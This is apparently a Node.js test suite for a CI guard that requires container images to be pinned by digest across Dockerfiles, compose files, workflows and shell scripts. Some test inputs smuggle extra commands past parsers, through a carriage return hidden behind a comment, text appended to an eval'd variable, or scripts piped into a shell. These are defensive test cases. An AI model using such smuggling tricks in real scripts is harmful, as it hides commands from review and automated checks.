import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { dirname, join, relative, resolve, sep } from 'node:path';
import { fileURLToPath } from 'node:url';
import { stringify } from 'yaml';
import { authoredFiles } from './authored-source-inventory.cjs';
import {
  DIGEST_VARIANTS,
  REVIEWED_PROGRAMS,
  SOURCED_LIBRARIES,
  TAGLESS,
  tokenizeShell,
  validateDockerfilePins,
  validateInfraImagePins as validateWholeTree,
} from './check-dockerfile-pins-lib.mjs';
import { continuedDollar, shellInvocation } from './ci-shell-text-lib.mjs';

// Task 368 L3: the lib reads the whole tree unless told otherwise (`complete` defaults ON); these tests feed it a
// few files, so they say `complete: false` once here. The default itself is pinned by its own test.
const validateInfraImagePins = (files, policy = {}) =>
  validateWholeTree(files, { complete: false, ...policy });
const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const A = `sha256:${'a'.repeat(64)}`;
const B = `sha256:${'b'.repeat(64)}`;
const file = (text, name = 'services/x/Dockerfile') => ({ name, text });
const pinned = (digest = A) =>
  [
    `FROM node:22-alpine@${digest} AS deps`,
    'RUN npm install -g pnpm@11.22.0',
    'FROM deps AS build',
    `FROM node:22-alpine@${digest} AS runtime`,
  ].join('\n');

test('the committed Dockerfiles pass', () => {
  const result = spawnSync(process.execPath, [join(root, 'scripts', 'check-dockerfile-pins.mjs')], {
    encoding: 'utf8',
  });
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /17 Dockerfiles on one base/);
  assert.match(result.stdout, /infra image pins: \d+ image references in \d+ files, all pinned/);
});

test('a pinned file, including a FROM of an earlier stage, passes', () => {
  assert.deepEqual(validateDockerfilePins([file(pinned())]).errors, []);
});

test('a moving tag is refused', () => {
  const { errors } = validateDockerfilePins([file('FROM node:22-alpine AS deps')]);
  assert.match(errors[0], /not pinned by digest/);
});

test('two services on different digests are refused', () => {
  const { errors } = validateDockerfilePins([
    file(pinned(A), 'services/a/Dockerfile'),
    file(pinned(B), 'services/b/Dockerfile'),
  ]);
  assert.match(errors.join('\n'), /disagree/);
});

test('a bare apk upgrade is refused; a named one-package stop-gap is not', () => {
  assert.equal(
    validateDockerfilePins([file(`${pinned()}\nRUN apk --no-cache upgrade`)]).errors.length,
    1,
  );
  assert.deepEqual(
    validateDockerfilePins([file(`${pinned()}\nRUN apk --no-cache upgrade openssl`)]).errors,
    [],
  );
});

test('a truncated digest is not a digest', () => {
  const { errors } = validateDockerfilePins([file('FROM node:22-alpine@sha256:abc AS deps')]);
  assert.match(errors[0], /not pinned/);
});

// --- compose, workflow and CI-script images (L7-45) ------------------------

const C = `sha256:${'c'.repeat(64)}`;
const NO_EXEMPTIONS = {
  digestVariants: new Map(),
  tagless: new Map(),
  evaluatedOutputs: new Map(),
  executedPrograms: new Map(),
  reviewedPrograms: new Map(),
};
const compose = (text) => ({ name: 'docker-compose.yml', kind: 'compose', text });
const workflowYaml = (text) => ({ name: '.github/workflows/ci.yml', kind: 'workflow', text });
/** A workflow whose one step runs `script`; extra top-level keys merged in. */
const workflow = (script, extra = {}) =>
  workflowYaml(stringify({ ...extra, jobs: { a: { 'runs-on': 'x', steps: [{ run: script }] } } }));
const shell = (text) => ({ name: 'infrastructure/x/ci-up.sh', kind: 'shell', text });
const infra = (files, policy = NO_EXEMPTIONS) => validateInfraImagePins(files, policy);
const PINNED = `postgis/postgis:16-3.4@${A}`;
const notPinned = /is not pinned by digest/;

test('a compose image pinned as tag@digest is accepted; tag-only and digest-only are refused', () => {
  const ok = infra([compose(`services:\n  postgres:\n    image: ${PINNED}`)]);
  assert.deepEqual(ok.errors, []);
  assert.equal(ok.images.length, 1);
  assert.match(
    infra([compose('services:\n  r:\n    image: redis:7.4-alpine')]).errors[0],
    notPinned,
  );
  assert.match(
    infra([compose(`services:\n  r:\n    image: redis@${A}`)]).errors[0],
    /has no tag — pin it as <tag>@sha256/,
  );
});

test('compose: a quoted image key is still the image (Codex finding 1)', () => {
  for (const key of ["'image'", '"image"']) {
    const { errors } = infra([compose(`services:\n  postgres:\n    ${key}: postgres:16`)]);
    assert.equal(errors.length, 1, key);
    assert.match(errors[0], /service postgres\): image postgres:16 is not pinned/);
  }
});

test('compose: an image inherited through an anchor and a << merge key is resolved (Codex finding 1)', () => {
  const merged = [
    'x-base: &base',
    '  image: postgres:16',
    '  restart: always',
    'services:',
    '  db:',
    '    <<: *base',
    '    environment: { A: 1 }',
    '  copy: *base',
  ].join('\n');
  const { errors } = infra([compose(merged)]);
  assert.equal(errors.length, 2);
  assert.match(errors[0], /service db\): image postgres:16 is not pinned/);
  assert.match(errors[1], /service copy\): image postgres:16 is not pinned/);
  assert.deepEqual(infra([compose(merged.replace('postgres:16', `postgres:16@${A}`))]).errors, []);
});

test('compose: every profile is checked, not only the default one', () => {
  const { errors } = infra([
    compose(
      `services:\n  a:\n    image: ${PINNED}\n  ui:\n    profiles: [tools]\n    image: kafka-ui:v1`,
    ),
  ]);
  assert.match(errors[0], /service ui\): image kafka-ui:v1 is not pinned/);
});

test('compose interpolation: a default is checked, a variable without one fails closed', () => {
  const at = (image) => infra([compose(`services:\n  db:\n    image: "${image}"`)]).errors;
  assert.match(at('${PG_IMAGE:-postgres:16}')[0], /image postgres:16 is not pinned/);
  assert.deepEqual(at(`\${PG_IMAGE:-postgres:16@${A}}`), []);
  assert.match(at('${PG_IMAGE}')[0], /has no default this check can resolve/);
  assert.match(at('postgres:${PG_TAG}')[0], /has no default/);
});

test('compose: extends in the same file is followed; another file, build: and include: fail closed', () => {
  const base = `services:\n  base:\n    image: ${PINNED}\n`;
  assert.deepEqual(infra([compose(`${base}  child:\n    extends: base`)]).errors, []);
  assert.deepEqual(infra([compose(`${base}  child:\n    extends: { service: base }`)]).errors, []);
  assert.match(
    infra([compose(`${base}  child:\n    extends: { file: other.yml, service: x }`)]).errors[0],
    /extends a service in another file/,
  );
  assert.match(
    infra([compose('services:\n  app:\n    build: ./app')]).errors[0],
    /builds its image here/,
  );
  assert.match(
    infra([compose(`include: [other.yml]\n${base}`)]).errors[0],
    /include: brings in services this check does not read/,
  );
});

test('workflow: services:, container: and uses: docker:// images are checked', () => {
  const jobs = (job) => workflowYaml(stringify({ jobs: { a: job } }));
  const cases = [
    jobs({ services: { redis: { image: 'redis:7.4-alpine' } } }),
    jobs({ container: 'node:22-alpine' }),
    jobs({ container: { image: 'node:22-alpine' } }),
    jobs({ steps: [{ uses: 'docker://alpine:3.20' }] }),
  ];
  for (const file of cases) {
    const { errors } = infra([file]);
    assert.equal(errors.length, 1, file.text);
    assert.match(errors[0], notPinned);
  }
});

test('every docker command on a line is checked, after ; && || | (Codex finding 2)', () => {
  for (const separator of [' ; ', ' && ', ' || ', ' | ', ' & ']) {
    const { errors } = infra([
      workflow(`docker pull ${PINNED}${separator}docker run ubuntu:24.04`),
    ]);
    assert.equal(errors.length, 1, separator);
    assert.match(errors[0], /image ubuntu:24\.04 is not pinned/, separator);
  }
});

test('docker \\ newline run … is one command (Codex finding 2)', () => {
  const { errors } = infra([workflow('set -e\ndocker \\\n  run --rm \\\n  ubuntu:24.04 true\n')]);
  assert.equal(errors.length, 1);
  assert.match(errors[0], /ci\.yml:\d+: image ubuntu:24\.04 is not pinned/);
});

test('docker inside $( ), backticks, a subshell or a here-document fed to bash is found', () => {
  for (const script of [
    'id=$(docker run -d ubuntu:24.04)',
    'id=`docker run -d ubuntu:24.04`',
    'echo "$(docker run ubuntu:24.04)"',
    '( cd /tmp && docker run ubuntu:24.04 )',
    'bash <<EOF\ndocker run ubuntu:24.04\nEOF\n',
    'if true; then docker run ubuntu:24.04; fi',
    'timeout 60 docker run ubuntu:24.04',
  ]) {
    const { errors } = infra([workflow(script)]);
    assert.ok(
      errors.some((e) => /ubuntu:24\.04 is not pinned/.test(e)),
      `${script}\n${errors.join('\n')}`,
    );
  }
});

test('text that only mentions docker is not a command', () => {
  for (const script of [
    '# docker run ubuntu:24.04 in a comment',
    'echo "docker run ubuntu:24.04"',
    "echo 'docker run ubuntu:24.04'",
    'cat <<EOF\ndocker run ubuntu:24.04\nEOF\n',
    'grep -q x <<< "docker run ubuntu:24.04"',
  ]) {
    assert.deepEqual(infra([workflow(script)]).errors, [], script);
  }
});

test('a docker verb, option or global option the check cannot classify fails closed', () => {
  assert.match(
    infra([workflow('docker build -t x .')]).errors[0],
    /docker build is not a command this check can classify/,
  );
  assert.match(
    infra([workflow('docker buildx bake')]).errors[0],
    /docker buildx is not a command this check can classify/,
  );
  assert.match(
    infra([workflow(`docker run --frobnicate x ${PINNED}`)]).errors[0],
    /cannot tell whether docker option --frobnicate takes a value/,
  );
  assert.match(
    infra([workflow(`docker --weird run ${PINNED}`)]).errors[0],
    /global option --weird/,
  );
  assert.deepEqual(infra([workflow(`docker -H tcp://x:2375 run ${PINNED}`)]).errors, []);
  assert.deepEqual(
    infra([workflow('docker logs --tail 5 x; docker exec x true; docker rm -f x')]).errors,
    [],
  );
});

test('docker compose may name only the compose file this check validates', () => {
  assert.deepEqual(infra([workflow('docker compose -f docker-compose.yml up -d')]).errors, []);
  assert.deepEqual(infra([workflow('docker compose --profile tools up -d')]).errors, []);
  assert.match(
    infra([workflow('docker compose -f other.yml up -d')]).errors[0],
    /a compose file this check does not validate/,
  );
});

test('a script the check cannot split fails closed', () => {
  assert.match(
    infra([shell("docker run 'ubuntu:24.04")]).errors[0],
    /cannot split this script into commands \(unclosed single quote/,
  );
});

test('image-pin-exempt with a reason exempts that command; without one it is an error', () => {
  const exempt = workflow(
    'docker run ubuntu:24.04 true # image-pin-exempt: a throwaway probe of the runner itself',
  );
  assert.deepEqual(infra([exempt]).errors, []);
  const above = workflow(
    '# image-pin-exempt: same probe, marked on the line above\ndocker run ubuntu:24.04',
  );
  assert.deepEqual(infra([above]).errors, []);
  const bare = infra([workflow('docker run ubuntu:24.04 # image-pin-exempt:')]).errors;
  assert.ok(bare.some((e) => /image-pin-exempt needs a reason/.test(e)));
  assert.ok(bare.some((e) => /ubuntu:24\.04 is not pinned/.test(e)));
});

test('variables: ${{ env.X }} is read, a shell variable only as a preamble readonly literal; anything else fails closed', () => {
  const minio = `cgr.dev/x/minio:1@${A}`;
  const env = { env: { MINIO_IMAGE: minio } };
  assert.deepEqual(
    infra([workflow('docker run -d "${{ env.MINIO_IMAGE }}" server', env)]).errors,
    [],
  );
  assert.match(
    infra([
      workflow('docker run -d "${{ env.MINIO_IMAGE }}"', {
        env: { MINIO_IMAGE: 'minio/minio:latest' },
      }),
    ]).errors[0],
    notPinned,
  );
  assert.match(
    infra([workflow('docker run -d "$OTHER"')]).errors[0],
    /names OTHER, which is no preamble readonly literal/,
  );
  assert.match(
    infra([workflow('docker run -d ${{ matrix.image }}')]).errors.join('\n'),
    /\$\{\{ matrix\.image \}\}/,
  );
  assert.match(
    infra([workflow('IMG=$(cat image.txt)\ndocker run "$IMG"')]).errors[0],
    /image \$IMG names IMG, which is no preamble readonly literal/,
  );
  const script = (image) =>
    shell(
      `set -euo pipefail\nreadonly IMAGE=${image}\ndocker run --rm --user 0 \\\n  --entrypoint bash "\${IMAGE}" /x.sh`,
    );
  assert.match(
    infra([script('apache/kafka:3.9.0')]).errors[0],
    /ci-up\.sh:3: image apache\/kafka:3\.9\.0 is not pinned/,
  );
  assert.deepEqual(infra([script(`apache/kafka:3.9.0@${A}`)]).errors, []);
});

test('a local tag of a pinned image is that image, across steps; a local tag of a moving one is not', () => {
  const steps = (source) =>
    workflowYaml(
      stringify({
        jobs: {
          a: {
            steps: [
              { run: `docker pull ${source}\ndocker tag ${source} \\\n  rasta/clamav-pinned:ci\n` },
              { run: 'docker run --rm rasta/clamav-pinned:ci -c true' },
            ],
          },
        },
      }),
    );
  assert.deepEqual(infra([steps(`clamav/clamav:1.5.4@${A}`)]).errors, []);
  const { errors } = infra([steps('clamav/clamav:1.5.4')]);
  assert.ok(errors.length >= 2, errors.join('\n')); // the pull, the tag's source, the run
  assert.ok(errors.some((e) => /rasta\/clamav-pinned:ci is not pinned/.test(e)));
});

test('one repository at two digests is refused, naming both places', () => {
  const { errors } = infra([
    compose(`services:\n  db:\n    image: ${PINNED}`),
    workflowYaml(
      stringify({ jobs: { a: { services: { pg: { image: `postgis/postgis:16-3.4@${B}` } } } } }),
    ),
  ]);
  assert.equal(errors.length, 1);
  assert.match(errors[0], /postgis\/postgis is pinned at 2 digests/);
  assert.match(errors[0], /docker-compose\.yml:3/);
  assert.match(errors[0], /ci\.yml:\d+/);
});

test('DIGEST_VARIANTS names the exact digests: those pass, a third is refused, an unused one is stale (Codex finding 3)', () => {
  const policy = {
    digestVariants: new Map([['x/mc', { digests: [A, B], reason: 'two variants, on purpose' }]]),
    tagless: new Map(),
    evaluatedOutputs: new Map(),
  };
  const at = (...digests) =>
    infra(
      [
        compose(
          `services:\n${digests.map((d, i) => `  s${i}:\n    image: x/mc:1@${d}`).join('\n')}`,
        ),
      ],
      policy,
    ).errors;
  assert.deepEqual(at(A, B), []);
  const third = at(A, B, C);
  assert.equal(third.length, 1);
  assert.match(
    third[0],
    new RegExp(`x/mc is pinned at ${C}, which is not one of the 2 digests DIGEST_VARIANTS allows`),
  );
  assert.match(
    at(A)[0],
    new RegExp(`DIGEST_VARIANTS allows x/mc@${B}, which nothing uses any more`),
  );
});

test('TAGLESS names exact references: listed ones pass, any other digest-only image is refused, an unused entry is stale (Codex finding 4)', () => {
  const policy = {
    digestVariants: new Map(),
    tagless: new Map([[`x/minio@${A}`, 'no tag published']]),
    evaluatedOutputs: new Map(),
  };
  assert.deepEqual(infra([compose(`services:\n  m:\n    image: x/minio@${A}`)], policy).errors, []);
  assert.match(
    infra([compose(`services:\n  m:\n    image: x/minio@${B}`)], policy).errors.join('\n'),
    /x\/minio@sha256:b+ has no tag/,
  );
  assert.match(
    infra([compose(`services:\n  m:\n    image: x/minio:1@${A}`)], policy).errors[0],
    /TAGLESS lists x\/minio@sha256:a+, which nothing uses without a tag any more/,
  );
});

test('the committed exemptions say why and are exact', () => {
  for (const [repository, { digests, reason }] of DIGEST_VARIANTS) {
    assert.equal(digests.length, 2, repository);
    assert.ok(reason.length > 40, repository);
  }
  for (const [reference, reason] of TAGLESS) {
    assert.match(reference, /^[a-z0-9./-]+@sha256:[0-9a-f]{64}$/);
    assert.match(reason, /could not be verified/);
  }
});

test('tokenizeShell joins continuations and splits at every separator', () => {
  const { commands } = tokenizeShell('a 1 \\\n  2; b && c || d | e\n# x\nf "g h" \'i\'');
  assert.deepEqual(
    commands.map((c) => c.words.map((w) => w.value).join(' ')),
    ['a 1 2', 'b', 'c', 'd', 'e', 'f g h i'],
  );
  assert.equal(commands[0].startLine, 0);
  assert.equal(commands.at(-1).startLine, 3);
});

// FU-077 R1: bash reads a carriage return as a word character, so `echo a\r# ; docker
// run x` runs docker. The pin guard reads shell text through the shared policy and
// refuses it instead of splitting there (it used to treat CR as a blank).
test('FU-077: a carriage return or control character is refused, not read past', () => {
  for (const src of ['echo a\r# ; docker run node:22', 'docker run node:22', 'true\x0b'])
    assert.throws(() => tokenizeShell(src), /carriage return, control or invisible blank/);
  const { errors } = validateDockerfilePins([file(`FROM node:22@${A}\rFROM node:latest\n`)]);
  assert.ok(
    errors.some((error) => /cannot be read: a carriage return/.test(error)),
    errors.join(),
  );
  const workflow = stringify({
    jobs: { j: { steps: [{ run: 'echo a\r# ; docker run node:22' }] } },
  });
  const infra = validateInfraImagePins([
    { kind: 'workflow', name: '.github/workflows/x.yml', text: workflow },
  ]);
  assert.ok(
    infra.errors.some((error) => /carriage return/.test(error)),
    infra.errors.join(),
  );
});

// PR #727 r2 F2: text bash EXPANDS or EVALUATES is read, never skipped: substitutions in a
// `${…}` operand, an arithmetic body or an expanding here-document; a literal `bash -c` or
// eval body; a shell anywhere in a command reading a here-document. A shell reading a pipe or
// a here-string, and eval of computed text, refuse. Ten shapes x run/create/pull x shell and
// workflow input: each one finds the unpinned image or refuses at that line.
const SHAPES = {
  'parameter default': (v) => `echo \${V:-$(docker ${v} alpine:latest)}`,
  'assignment prefix default': (v) => `X=\${V:-$(docker ${v} alpine:latest)} true`,
  'arithmetic substitution': (v) => `echo $(( 1 + $(docker ${v} alpine:latest) ))`,
  'expanding here-document': (v) => `cat <<EOF\n$(docker ${v} alpine:latest)\nEOF`,
  'expanding <<- here-document': (v) => `cat <<-EOF\n\t\`docker ${v} alpine:latest\`\n\tEOF`,
  'bash -c body': (v) => `bash -c 'docker ${v} alpine:latest'`,
  'eval body': (v) => `eval 'docker ${v} alpine:latest'`,
  'here-string into bash': (v) => `bash <<< 'docker ${v} alpine:latest'`,
  'pipeline into sh': (v) => `echo 'docker ${v} alpine:latest' | sh`,
  'env-prefixed quoted here-document': (v) => `env bash <<'EOF'\ndocker ${v} alpine:latest\nEOF`,
};
const bare = {
  evaluatedOutputs: new Map(),
  digestVariants: new Map(),
  tagless: new Map(),
  executedPrograms: new Map(),
  reviewedPrograms: new Map(),
};
const asInput = (kind, body) =>
  kind === 'shell'
    ? { kind, name: 'scripts/x.sh', text: body }
    : {
        kind,
        name: '.github/workflows/x.yml',
        text: stringify({ jobs: { j: { steps: [{ run: body }] } } }),
      };
test('PR #727 r2 F2: expanded, evaluated and shell-input text is read or refused, never skipped', () => {
  for (const [shape, script] of Object.entries(SHAPES))
    for (const verb of ['run', 'create', 'pull'])
      for (const kind of ['shell', 'workflow']) {
        const { errors, images } = validateInfraImagePins([asInput(kind, script(verb))], bare);
        assert.ok(
          images.some(({ ref }) => ref === 'alpine:latest') || errors.length > 0,
          `${shape} ${verb} ${kind}: ${JSON.stringify({ errors, images })}`,
        );
      }
});
// FU-092: a script a shell is told to run must be one of the run's shell files.
const credsFile = { kind: 'shell', name: 'infra/creds.sh', text: 'true' };
test('PR #727 r2 F2: the controls stay readable; computed eval and -c bodies refuse', () => {
  const ok = (body, policy = bare) => {
    const { errors } = validateInfraImagePins([credsFile, asInput('shell', body)], policy);
    assert.deepEqual(errors, [], body);
  };
  // FU-092: a script operand counts only when it is a shell file of the run.
  const withFile = (body) => [
    { kind: 'shell', name: 'infrastructure/x.sh', text: 'true' },
    asInput('shell', body),
  ];
  assert.deepEqual(validateInfraImagePins(withFile('bash infrastructure/x.sh'), bare).errors, []);
  ok(`docker run --rm --entrypoint sh node:22@${A} -c 'true'`);
  ok('cat <<EOF\n$HOME and \\$(not run)\nEOF');
  ok('echo $((count + 1))');
  ok('c="$(KAFKA_SECRETS_DIR="${d}" bash infra/creds.sh service x)"\neval "${c}"', {
    ...bare,
    evaluatedOutputs: new Map([['infra/creds.sh', 'prints exports only']]),
  });
  const refusedWith = (body, pattern, policy = bare) => {
    const { errors } = validateInfraImagePins([credsFile, asInput('shell', body)], policy);
    assert.ok(
      errors.some((error) => pattern.test(error)),
      `${body}: ${errors.join()}`,
    );
  };
  refusedWith('eval "$X"', /eval runs text this check does not read/);
  const creds = { ...bare, evaluatedOutputs: new Map([['infra/creds.sh', 'prints exports only']]) };
  for (const body of [
    'c="$(bash infra/creds.sh)"\nc+="; docker run x"\neval "${c}"',
    'c="$(bash infra/creds.sh)"\nread -r c\neval "${c}"',
    'eval "${c}"\nc="$(bash infra/creds.sh)"',
  ])
    refusedWith(body, /eval runs text/, creds);
  refusedWith('bash --rcfile x.sh', /option --rcfile is not one this check reads/);
  refusedWith('c="$(bash other.sh)"\neval "${c}"', /eval runs text/);
  refusedWith('bash -c "$X"', /bash -c runs a body this check cannot read/);
  refusedWith('bash < x.sh', /reads its commands from a redirection/);
  refusedWith('bash -s x', /reads its commands from a pipe, a here-string or the terminal/);
  refusedWith('true', /EVALUATED_OUTPUTS lists a.sh, which nothing evaluates/, {
    ...bare,
    evaluatedOutputs: new Map([['a.sh', 'why']]),
  });
});

// FU-092 (PR #727 r2 F2 residuals): every expansion and evaluation stage keeps the execution it
// carries or refuses it. Each row is an escape that returned no image and no error on d409a643,
// while bash ran the docker command. `image`: the script is read and the image found; a pattern:
// refused with that reason. Three verbs x shell and workflow input.
const RESIDUALS = {
  'here-document operator before a quoted shell': [
    (v) => `<<'EOF' bash\ndocker ${v} alpine:latest\nEOF`,
    'image',
  ],
  'here-document operator before env bash': [
    (v) => `<<EOF env bash\ndocker ${v} alpine:latest\nEOF`,
    'image',
  ],
  // PR #805 r2 F1: the expanded text is what runs, so any expansion in the body refuses.
  'expanding here-document into bash, substitution in a comment': [
    (v) => `bash <<EOF\n# $(docker ${v} alpine:latest)\nEOF`,
    /expanding here-document read by a shell contains an expansion/,
  ],
  'expanding here-document into bash, substitution in single quotes': [
    (v) => `bash <<EOF\necho '$(docker ${v} alpine:latest)'\nEOF`,
    /expanding here-document read by a shell contains an expansion/,
  ],
  'escaped newline after $ in a here-document': [
    (v) => `cat <<EOF\n$\\\n(docker ${v} alpine:latest)\nEOF`,
    /line continuation after "\$"/,
  ],
  'escaped newline after $ in arithmetic': [
    (v) => `echo $(( 1 + $\\\n(docker ${v} alpine:latest) ))`,
    /line continuation after "\$"/,
  ],
  'escaped newline after $ in a parameter default': [
    (v) => `echo \${V:-$\\\n(docker ${v} alpine:latest)}`,
    /line continuation after "\$"/,
  ],
  'escaped newline after $ in a double-quoted word': [
    (v) => `echo "$\\\n(docker ${v} alpine:latest)"`,
    /line continuation after "\$"/,
  ],
  'bash +c': [(v) => `bash +c 'docker ${v} alpine:latest'`, 'image'],
  'bash +sc': [(v) => `bash +sc 'docker ${v} alpine:latest'`, 'image'],
  'bash -eo pipefail -c': [(v) => `bash -eo pipefail -c 'docker ${v} alpine:latest'`, 'image'],
  'bash with a computed option': [
    (v) => `OPT=-c; bash "$OPT" 'docker ${v} alpine:latest'`,
    /bash has a computed option or operand/,
  ],
  'a pipe into bash -': [
    (v) => `echo 'docker ${v} alpine:latest' | bash -`,
    /reads its commands from a pipe/,
  ],
  'a pipe into bash /dev/stdin': [
    (v) => `echo 'docker ${v} alpine:latest' | bash /dev/stdin`,
    /reads its commands from a pipe/,
  ],
  'a script that is not a CI shell file': [
    (v) => `printf '%s' 'docker ${v} alpine:latest' > tools/other.sh\nbash tools/other.sh`,
    /runs tools\/other\.sh, a script this check does not read/,
  ],
  'a literal here-string into bash': [(v) => `bash <<< 'docker ${v} alpine:latest'`, 'image'],
  'ash -c': [(v) => `ash -c 'docker ${v} alpine:latest'`, 'image'],
  'fish -c': [(v) => `fish -c 'docker ${v} alpine:latest'`, /syntax this check does not read/],
};
const outcome = (kind, body, policy = bare) => {
  const { errors, images } = validateInfraImagePins([asInput(kind, body)], policy);
  return { errors, found: images.some(({ ref }) => ref === 'alpine:latest') };
};
test('FU-092: shell dispatch, heredoc ownership and escaped newlines keep or refuse the execution', () => {
  for (const [shape, [script, expected]] of Object.entries(RESIDUALS))
    for (const verb of ['run', 'create', 'pull'])
      for (const kind of ['shell', 'workflow']) {
        const { errors, found } = outcome(kind, script(verb));
        const at = `${shape} ${verb} ${kind}: ${JSON.stringify(errors)}`;
        if (expected === 'image') assert.ok(found, at);
        else
          assert.ok(
            errors.some((error) => expected.test(error)),
            at,
          );
      }
});
test('FU-092: the controls stay readable', () => {
  const ok = (body) => assert.deepEqual(outcome('shell', body).errors, [], body);
  ok("<<'EOF' bash\necho hi\nEOF");
  ok("bash +c 'echo hi'");
  ok("bash -eo pipefail -c 'echo hi'");
  ok('bash <<< "echo hi"');
  ok('cat <<EOF\n$HOME \\\nand more\nEOF');
  const files = [
    { kind: 'shell', name: 'infrastructure/x.sh', text: 'true' },
    asInput('shell', 'bash -- ./infrastructure/x.sh'),
  ];
  assert.deepEqual(validateInfraImagePins(files, bare).errors, []);
});
test('FU-092: a workflow step that runs elsewhere does not read a relative script by name', () => {
  const yaml = (extra) =>
    stringify({
      jobs: { j: { steps: [{ run: 'bash infrastructure/x.sh', ...extra }] } },
    });
  const files = (text) => [
    { kind: 'shell', name: 'infrastructure/x.sh', text: 'true' },
    { kind: 'workflow', name: '.github/workflows/x.yml', text },
  ];
  assert.deepEqual(validateInfraImagePins(files(yaml({})), bare).errors, []);
  assert.match(
    validateInfraImagePins(files(yaml({ 'working-directory': 'tools' })), bare).errors.join(),
    /runs infrastructure\/x\.sh, a script this check does not read/,
  );
});
test('FU-092: shellInvocation reads bash the way bash reads its options', () => {
  const words = (...values) => values.map((value) => ({ value }));
  const run = (...values) => shellInvocation(words(...values), 'bash');
  assert.equal(run('+c', 'x').body.value, 'x');
  assert.equal(run('-ec', 'x').body.value, 'x');
  assert.equal(run('-co', 'pipefail', 'x').body.value, 'x');
  assert.equal(run('-o', 'pipefail', '-c', 'x').body.value, 'x');
  assert.equal(run('--norc', '-c', 'x').body.value, 'x');
  assert.equal(run('-sc', 'x').body.value, 'x'); // -c wins over -s, as in bash
  assert.equal(run('--', 'file.sh').file.value, 'file.sh');
  assert.equal(run('-', 'file.sh').file.value, 'file.sh'); // `-` is `--`
  assert.equal(run('file.sh', '-c').file.value, 'file.sh');
  assert.deepEqual(run('-s', 'x'), { stdin: true });
  assert.deepEqual(run(), { stdin: true });
  assert.deepEqual(run('-'), { stdin: true });
  for (const refused of [
    ['--rcfile', 'x'],
    ['--init-file', 'x'],
    ['+'],
    ['-1'],
    ['-c'],
    ['-o'],
    ['$X', 'y'],
    ['-c', '$X'],
    ['-o', '$X', '-c', 'y'],
  ])
    assert.ok(run(...refused).problem, refused.join(' '));
  assert.ok(shellInvocation([{ value: 'x', opaque: true }], 'bash').problem);
  assert.ok(shellInvocation(words('-c', 'x'), '/bin/fish').problem);
  assert.equal(continuedDollar('a$\\\n(', 1), true);
  assert.equal(continuedDollar('a$\\\n\\\n(', 1), true);
  assert.equal(continuedDollar('a$\\(', 1), false);
  assert.equal(continuedDollar('a\\\n$(', 1), false);
});
// FU-092 (PR #727 r2 F2, eval rows): an evaluated variable's provenance is proved, not counted.
// The one approved producer, assigned unconditionally in the group the eval runs in (or one
// above it), is the only way a variable is evaluated.
test('FU-092: eval of a producer output needs proven provenance', () => {
  const creds = { ...bare, evaluatedOutputs: new Map([['infra/creds.sh', 'prints exports only']]) };
  const producer = 'c="$(bash infra/creds.sh)"';
  const refusedWith = (body) => {
    const { errors } = validateInfraImagePins([credsFile, asInput('shell', body)], creds);
    assert.ok(
      errors.some((error) => /^scripts\/x\.sh:\d+: eval runs text/.test(error)),
      `${body}: ${errors.join()}`,
    );
  };
  const approved = (body) => {
    const { errors } = validateInfraImagePins([credsFile, asInput('shell', body)], creds);
    assert.deepEqual(errors, [], body);
  };
  approved(`${producer}\neval "\${c}"`);
  approved(`${producer}\n( eval "\${c}" && true )`);
  approved(`( ${producer} && eval "\${c}" )`);
  approved(`( ${producer} && eval "\${c}" && true & )`); // the same backgrounded list
  approved(`( ${producer} && d="$(bash infra/creds.sh)" && eval "\${c}" && eval "\${d}" )`);
  approved(`${producer}\neval "\${c}"\nfor n in 1 2; do echo "$n"; done`);
  for (const body of [
    // a computed variable NAME is written (the name never appears as text)
    `${producer}\nprintf -v "$(printf '\\143')" '%s' 'docker run alpine:latest'\neval "\${c}"`,
    `${producer}\nprintf "$fmt" c 'docker run alpine:latest'\neval "\${c}"`,
    `${producer}\nread -r "$name"\neval "\${c}"`,
    `${producer}\ndeclare -n ref=c\nref='docker run alpine:latest'\neval "\${c}"`,
    `${producer}\nsource ./other.sh\neval "\${c}"`,
    // a default assignment writes it
    `${producer}\n: "\${c:=docker run alpine:latest}"\neval "\${c}"`,
    // the producer may not run: a conditional block, a || list, a subshell, a function
    `if false; then\n  ${producer}\nfi\neval "\${c}"`,
    `false || ${producer}\neval "\${c}"`,
    `( ${producer} )\neval "\${c}"`,
    `f() {\n  ${producer}\n}\neval "\${c}"`,
    `true && ${producer}\neval "\${c}"`,
    `false &&\n${producer}\neval "\${c}"`,
    `${producer} &\neval "\${c}"`,
    `${producer} | cat\neval "\${c}"`,
    `${producer} && true &\neval "\${c}"`,
    // the eval is inside a block that may run it again with another value
    `${producer}\nwhile true; do eval "\${c}"; done`,
  ])
    refusedWith(body);
});

// PR #727 r2 F3: Dockerfile instructions are read with BuildKit's whitespace and
// continuation rules, and every Dockerfile must have a base instruction that was read.
test('PR #727 r2 F3: an indented, continued or lower-case FROM is read; none at all refuses', () => {
  for (const text of [
    ' FROM alpine:latest\n',
    '\tFROM alpine:latest\n',
    'FROM \\\n  alpine:latest\n',
    'from alpine:latest\n',
    `  FROM node:22@${A} AS a\n  FROM alpine:latest\n`,
  ]) {
    const { errors } = validateDockerfilePins([file(text)]);
    assert.ok(
      errors.some((error) => /FROM alpine:latest is not pinned by digest/.test(error)),
      `${JSON.stringify(text)}: ${errors.join()}`,
    );
  }
  for (const [text, pattern] of [
    ['RUN true\n', /no FROM instruction was read/],
    ['', /no FROM instruction was read/],
    ['# escape=`\nFROM alpine:latest\n', /the parser directive escape/],
    ['# syntax=example/other\nFROM alpine:latest\n', /the parser directive syntax/],
    [`FROM --platform=linux/amd64 node:22@${A}\n`, /is not a form this check reads/],
    [`FROM node:22@${A}\nRUN apk \\\n  upgrade\n`, /apk upgrade/],
    [`FROM node:22@${A}\nRUN <<EOF\nFROM x\nEOF\n`, /a here-document/],
    [`FROM node:22@${A}\nRUN true \\`, /a continuation that never ends/],
  ]) {
    const { errors } = validateDockerfilePins([file(text)]);
    assert.ok(
      errors.some((error) => pattern.test(error)),
      `${JSON.stringify(text)}: ${errors.join()}`,
    );
  }
  const good = `# syntax=docker/dockerfile:1.7\n# a note, then FROM inside text: FROM x\n  FROM node:22@${A} AS a\n  # a comment\n  FROM a\n`;
  assert.deepEqual(validateDockerfilePins([file(good)]).errors, []);
});

// PR #805 r2 F1: text that is generated, rewritten or handed to another program as a command
// string is never "nothing relevant". Each shape returned no image and no error on ea79eb47
